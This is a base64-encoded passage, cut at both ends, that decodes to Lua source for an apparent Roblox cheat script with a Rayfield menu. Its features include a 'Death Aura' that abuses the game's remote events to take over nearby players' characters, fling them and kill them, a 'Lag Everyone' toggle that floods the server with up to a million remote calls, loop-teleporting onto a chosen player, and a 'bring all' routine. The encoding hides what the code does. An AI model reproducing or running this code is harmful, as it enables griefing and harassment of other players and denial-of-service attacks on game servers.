vc2l0aW9uIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicC5OYW1lID0gIlRLQXVyYVBvcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicC5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KDEwMDAwMCwgMTAwMDAwLCAxMDAwMDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnAuRCA9IDUwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJwLlAgPSA1MDAwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJwLlBhcmVudCA9IHRvcnNvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYmcgPSB0b3JzbzpGaW5kRmlyc3RDaGlsZCgiVEtBdXJhR3lybyIpIG9yIEluc3RhbmNlLm5ldygiQm9keUd5cm8iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJnLk5hbWUgPSAiVEtBdXJhR3lybyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZy5NYXhUb3JxdWUgPSBWZWN0b3IzLm5ldygxMDAwMDAsIDEwMDAwMCwgMTAwMDAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJnLkQgPSA1MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZy5QID0gNTAwMDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZy5QYXJlbnQgPSB0b3JzbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJwLlBvc2l0aW9uID0gbXlSb290LlBvc2l0aW9uICsgY2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogMTUgKyBWZWN0b3IzLm5ldygwLCA1LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJnLkNGcmFtZSA9IENGcmFtZS5uZXcodG9yc28uUG9zaXRpb24sIG15Um9vdC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgIGVuZAogICAgZW5kKQogICAgY29yb3V0aW5lLnJlc3VtZShBdXJhU2V0dGluZ3MudGVsZWtpbmVzaXNBdXJhQ29yb3V0aW5lKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHN0b3BUZWxla2luZXNpc0F1cmEoKQogICAgaWYgQXVyYVNldHRpbmdzLnRlbGVraW5lc2lzQXVyYUNvcm91dGluZSB0aGVuCiAgICAgICAgY29yb3V0aW5lLmNsb3NlKEF1cmFTZXR0aW5ncy50ZWxla2luZXNpc0F1cmFDb3JvdXRpbmUpCiAgICAgICAgQXVyYVNldHRpbmdzLnRlbGVraW5lc2lzQXVyYUNvcm91dGluZSA9IG5pbAogICAgZW5kCmVuZAoKQXVyYXNUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiVGVsZWtpbmVzaXMgQXVyYSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiVGVsZWtpbmVzaXNBdXJhIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgaWYgVmFsdWUgdGhlbgogICAgICAgICAgICBzdGFydFRlbGVraW5lc2lzQXVyYSgpCiAgICAgICAgZWxzZQogICAgICAgICAgICBzdG9wVGVsZWtpbmVzaXNBdXJhKCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgZnVuY3Rpb24gZGVhdGgodmFsdWUpCiAgICBpZiBBdXJhU2V0dGluZ3MuZGVhdGhBdXJhQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgQXVyYVNldHRpbmdzLmRlYXRoQXVyYUNvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICBlbmQKICAgIGlmIHZhbHVlIHRoZW4KICAgICAgICBTaGFyZWRTZXR0aW5ncy5EZWF0aF9BdXJhID0gdHJ1ZQogICAgICAgIEF1cmFTZXR0aW5ncy5kZWF0aEF1cmFDb25uZWN0aW9uID0gUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgaGVhZCA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICBpZiByb290IGFuZCBoZWFkIGFuZCBodW1hbm9pZCBhbmQgaHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJvb3QuUG9zaXRpb24gLSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbikuTWFnbml0dWRlIDw9IDI1IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNldE5ldHdvcmtPd25lcjpGaXJlU2VydmVyKHJvb3QsIHJvb3QuQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZXN0cm95R3JhYkxpbmU6RmlyZVNlcnZlcihyb290KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBoZWFkOkZpbmRGaXJzdENoaWxkKCJQYXJ0T3duZXIiKSBhbmQgaGVhZC5QYXJ0T3duZXIuVmFsdWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhodW1hbm9pZC5QYXJlbnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMTAwMDAwMDAwMCwgMTAwMDAwMDAwMCwgLTEwMDAwMDAwMDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhodW1hbm9pZC5QYXJlbnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMTAwMDAwMDAwMCwgMTAwMDAwMDAwMCwgLTEwMDAwMDAwMDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ2ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAtOTk5OTk5OSwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcoOTAwMDAwMDAwMCwgOTAwMDAwMDAwMCwgOTAwMDAwMDAwMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ2LlAgPSAxMDAwMDAwNzUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ2LlBhcmVudCA9IHJvb3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZC5KdW1wID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQuQnJlYWtKb2ludHNPbkRlYXRoID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuRGVhZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suZGVsYXkoMiwgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJ2IGFuZCBidi5QYXJlbnQgdGhlbiBidjpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgU2hhcmVkU2V0dGluZ3MuRGVhdGhfQXVyYSA9IGZhbHNlCiAgICBlbmQKZW5kCgpBdXJhc1RhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJEZWF0aCBBdXJhIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgRmxhZyA9ICJEZWF0aEF1cmEiLAogICAgQ2FsbGJhY2sgPSBkZWF0aAp9KQoKbG9jYWwgVGVsZXBvcnRTZWN0aW9uID0gVGVsZXBvcnRUYWI6Q3JlYXRlU2VjdGlvbigiVFAgQ29udHJvbHMiKQoKbG9jYWwgdGVsZXBvcnRUYXJnZXQgPSBuaWwKbG9jYWwgbG9vcFRlbGVwb3J0RW5hYmxlZCA9IGZhbHNlCmxvY2FsIGxvb3BUZWxlcG9ydENvbm5lY3Rpb24gPSBuaWwKCmxvY2FsIFRlbGVwb3J0RHJvcGRvd24gPSBUZWxlcG9ydFRhYjpDcmVhdGVEcm9wZG93bih7CiAgICBOYW1lID0gIlBpY2sgUGxheWVyIiwKICAgIE9wdGlvbnMgPSBnZXRBbGxQbGF5ZXJzKCksCiAgICBDdXJyZW50T3B0aW9uID0gIiIsCiAgICBNdWx0aXBsZU9wdGlvbnMgPSBmYWxzZSwKICAgIEZsYWcgPSAiVGVsZXBvcnRQbGF5ZXIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICB0ZWxlcG9ydFRhcmdldCA9IFZhbHVlCiAgICBlbmQKfSkKCmxvY2FsIGZ1bmN0aW9uIHRlbGVwb3J0VG9QbGF5ZXIoKQogICAgaWYgbm90IHRlbGVwb3J0VGFyZ2V0IG9yIHRlbGVwb3J0VGFyZ2V0ID09ICIiIHRoZW4gcmV0dXJuIGVuZAogICAgCiAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRlbGVwb3J0VGFyZ2V0KQogICAgaWYgbm90IHRhcmdldCB0aGVuCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIAogICAgbG9jYWwgdGFyZ2V0Q2hhciA9IHRhcmdldC5DaGFyYWN0ZXIKICAgIGlmIG5vdCB0YXJnZXRDaGFyIHRoZW4gcmV0dXJuIGVuZAogICAgCiAgICBsb2NhbCB0YXJnZXRSb290ID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBub3QgdGFyZ2V0Um9vdCB0aGVuIHJldHVybiBlbmQKICAgIAogICAgbG9jYWwgbXlDaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBub3QgbXlDaGFyIHRoZW4gcmV0dXJuIGVuZAogICAgCiAgICBsb2NhbCBteVJvb3QgPSBteUNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaWYgbm90IG15Um9vdCB0aGVuIHJldHVybiBlbmQKICAgIAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIG15Um9vdC5DRnJhbWUgPSB0YXJnZXRSb290LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMiwgMCkKICAgIGVuZCkKZW5kCgpUZWxlcG9ydFRhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJUZWxlcG9ydCBOb3ciLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgdGVsZXBvcnRUb1BsYXllcigpID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkVycm9yIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSAiUGljayBhIHBsYXllciBmaXJzdCIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkxvb3AgVGVsZXBvcnQiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBGbGFnID0gIkxvb3BUZWxlcG9ydCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGxvb3BUZWxlcG9ydEVuYWJsZWQgPSBWYWx1ZQogICAgICAgIAogICAgICAgIGlmIGxvb3BUZWxlcG9ydENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICBsb29wVGVsZXBvcnRDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBsb29wVGVsZXBvcnRDb25uZWN0aW9uID0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgaWYgVmFsdWUgdGhlbgogICAgICAgICAgICBsb29wVGVsZXBvcnRDb25uZWN0aW9uID0gUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBsb29wVGVsZXBvcnRFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICB0ZWxlcG9ydFRvUGxheWVyKCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiTG9vcCBUUCIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gIkZvbGxvd2luZyAiIC4uICh0ZWxlcG9ydFRhcmdldCBvciAicGxheWVyIiksCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICB0YXNrLndhaXQoMC41KQogICAgbG9jYWwgcGxheWVycyA9IGdldEFsbFBsYXllcnMoKQogICAgVGVsZXBvcnREcm9wZG93bjpSZWZyZXNoKHBsYXllcnMsIHRydWUpCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiB0ZWxlcG9ydFRhcmdldCA9PSBwbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgdGVsZXBvcnRUYXJnZXQgPSBuaWwKICAgICAgICBsb29wVGVsZXBvcnRFbmFibGVkID0gZmFsc2UKICAgICAgICBpZiBsb29wVGVsZXBvcnRDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgbG9vcFRlbGVwb3J0Q29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgbG9vcFRlbGVwb3J0Q29ubmVjdGlvbiA9IG5pbAogICAgICAgIGVuZAogICAgZW5kCiAgICBsb2NhbCBwbGF5ZXJzID0gZ2V0QWxsUGxheWVycygpCiAgICBUZWxlcG9ydERyb3Bkb3duOlJlZnJlc2gocGxheWVycywgdHJ1ZSkKZW5kKQoKbG9jYWwgUmFuZG9tU2VjdGlvbiA9IFJhbmRvbVRhYjpDcmVhdGVTZWN0aW9uKCJFeHRyYSBGZWF0dXJlcyIpCgpsb2NhbCBsYWdFbmFibGVkID0gZmFsc2UKbG9jYWwgbGFnSW50ZW5zaXR5ID0gMTAwCmxvY2FsIGxhZ0Nvbm5lY3Rpb24gPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIGxhZ0Z1bmN0aW9uKCkKICAgIGxhZ0Nvbm5lY3Rpb24gPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgbGFnRW5hYmxlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBub3QgaXNJblBsb3QocGxheWVyKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAxLCBsYWdJbnRlbnNpdHkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ3JlYXRlR3JhYkxpbmU6RmlyZVNlcnZlcihyb290LCBDRnJhbWUubmV3KG1hdGgucmFuZG9tKC05OTk5OSwgOTk5OTkpLCBtYXRoLnJhbmRvbSgtOTk5OTksIDk5OTk5KSwgbWF0aC5yYW5kb20oLTk5OTk5LCA5OTk5OSkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZXROZXR3b3JrT3duZXI6RmlyZVNlcnZlcihyb290LCBDRnJhbWUubmV3KG1hdGgucmFuZG9tKC05OTk5OSwgOTk5OTkpLCBtYXRoLnJhbmRvbSgtOTk5OTksIDk5OTk5KSwgbWF0aC5yYW5kb20oLTk5OTk5LCA5OTk5OSkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbmRHcmFiTGluZTpGaXJlU2VydmVyKG1hdGgucmFuZG9tKDEsIDEwMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlc3Ryb3lHcmFiTGluZTpGaXJlU2VydmVyKHJvb3QpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKUmFuZG9tVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkxhZyBFdmVyeW9uZSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiTGFnIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgbGFnRW5hYmxlZCA9IFZhbHVlCiAgICAgICAgCiAgICAgICAgaWYgbGFnQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgIGxhZ0Nvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGxhZ0Nvbm5lY3Rpb24gPSBuaWwKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIGxhZ0Z1bmN0aW9uKCkKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkxhZyBBbGwiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICJMYWdnaW5nIHNlcnZlciIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClJhbmRvbVRhYjpDcmVhdGVTbGlkZXIoewogICAgTmFtZSA9ICJMYWcgQW1vdW50IiwKICAgIFJhbmdlID0gezEwLCAxMDAwMDAwfSwKICAgIEluY3JlbWVudCA9IDEwMCwKICAgIFN1ZmZpeCA9ICIgY2FsbHMiLAogICAgQ3VycmVudFZhbHVlID0gMTAwLAogICAgRmxhZyA9ICJMYWdJbnRlbnNpdHkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBsYWdJbnRlbnNpdHkgPSBWYWx1ZQogICAgZW5kCn0pCgpsb2NhbCBCcmluZ0FsbFNlY3Rpb24gPSBSYW5kb21UYWI6Q3JlYXRlU2VjdGlvbigiQnJpbmcgRmVhdHVyZXMiKQoKbG9jYWwgYnJpbmdBbGxTZXR0aW5ncyA9IHsKICAgIEEgPSBmYWxzZSwKICAgIFEgPSB7fSwKICAgIFBvcyA9IG5pbCwKICAgIENhbSA9IG5pbCwKICAgIFIgPSAxNSwKICAgIENvbm4gPSBuaWwsCiAgICBXTCA9IGZhbHNlLAogICAgQ0IgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQp9CgpicmluZ0FsbFNldHRpbmdzLkNCLkFuY2hvcmVkID0gdHJ1ZQpicmluZ0FsbFNldHRpbmdzLkNCLkNhbkNvbGxpZGUgPSBmYWxzZQpicmluZ0FsbFNldHRpbmdzLkNCLlRyYW5zcGFyZW5jeSA9IDEKYnJpbmdBbGxTZXR0aW5ncy5DQi5DYW5RdWVyeSA9IGZhbHNlCmJyaW5nQWxsU2V0dGluZ3MuQ0IuU2l6ZSA9IFZlY3RvcjMubmV3KDEwLCAxMCwgMTApCgpsb2NhbCBmdW5jdGlvbiBGekNhbSgpCiAgICBsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgYnJpbmdBbGxTZXR0aW5ncy5DQi5DRnJhbWUgPSBicmluZ0FsbFNldHRpbmdzLkNhbQogICAgYnJpbmdBbGxTZXR0aW5ncy5DQi5QYXJlbnQgPSBXb3Jrc3BhY2UKICAgIGNhbWVyYS5DYW1lcmFUeXBlID0gRW51bS5DYW1lcmFUeXBlLlNjcmlwdGFibGUKICAgIGNhbWVyYS5DRnJhbWUgPSBicmluZ0FsbFNldHRpbmdzLkNhbQplbmQKCmxvY2FsIGZ1bmN0aW9uIFVuRnpDYW0oKQogICAgYnJpbmdBbGxTZXR0aW5ncy5DQi5QYXJlbnQgPSBuaWwKICAgIGxvY2FsIGNhbWVyYSA9IFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCiAgICBjYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20KICAgIGlmIGJyaW5nQWxsU2V0dGluZ3MuQ2FtIHRoZW4KICAgICAgICBjYW1lcmEuQ0ZyYW1lID0gYnJpbmdBbGxTZXR0aW5ncy5DYW0KICAgIGVuZAogICAgYnJpbmdBbGxTZXR0aW5ncy5DYW0gPSBuaWwKZW5kCgpsb2NhbCBmdW5jdGlvbiBOb0NvbChtb2RlbCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhtb2RlbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBJblBsb3QocGxheWVyKQogICAgbG9jYWwgcGxvdEl0ZW1zID0gV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJQbG90SXRlbXMiKQogICAgaWYgcGxvdEl0ZW1zIHRoZW4KICAgICAgICBsb2NhbCBwbGF5ZXJzSW5QbG90cyA9IHBsb3RJdGVtczpGaW5kRmlyc3RDaGlsZCgiUGxheWVyc0luUGxvdHMiKQogICAgICAgIGlmIHBsYXllcnNJblBsb3RzIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHBsYXllcnNJblBsb3RzOkZpbmRGaXJzdENoaWxkKHBsYXllci5OYW1lKSB+PSBuaWwKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKbG9jYWwgZnVuY3Rpb24gSW5SYWQocGFydCkKICAgIHJldHVybiAocGFydC5Qb3NpdGlvbiAtIGJyaW5nQWxsU2V0dGluZ3MuUG9zKS5NYWduaXR1ZGUgPD0gYnJpbmdBbGxTZXR0aW5ncy5SCmVuZAoKbG9jYWwgZnVuY3Rpb24gSWdub3JlKHBsYXllcikKICAgIHJldHVybiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgb3IgKGJyaW5nQWxsU2V0dGluZ3MuV0wgYW5kIExvY2FsUGxheWVyOklzRnJpZW5kc1dpdGgocGxheWVyLlVzZXJJZCkpCmVuZAoKbG9jYWwgZnVuY3Rpb24gUmVRKCkKICAgIGJyaW5nQWxsU2V0dGluZ3MuUSA9IHt9CiAgICBmb3IgXywgcGxheWVyIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIG5vdCBJZ25vcmUocGxheWVyKSBhbmQgcGxheWVyLkNoYXJhY3RlciBhbmQgbm90IEluUGxvdChwbGF5ZXIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgcm9vdCA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICBpZiByb290IGFuZCBub3QgSW5SYWQocm9vdCkgdGhlbgogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGJyaW5nQWxsU2V0dGluZ3MuUSwgcGxheWVyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIE5leHQoKQogICAgaWYgI2JyaW5nQWxsU2V0dGluZ3MuUSA9PSAwIHRoZW4KICAgICAgICBSZVEoKQogICAgICAgIGlmICNicmluZ0FsbFNldHRpbmdzLlEgPT0gMCB0aGVuCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGxvY2FsIHBsYXllciA9IGJyaW5nQWxsU2V0dGluZ3MuUVsxXQogICAgdGFibGUucmVtb3ZlKGJyaW5nQWxsU2V0dGluZ3MuUSwgMSkKICAgIAogICAgaWYgcGxheWVyIGFuZCBwbGF5ZXIuQ2hhc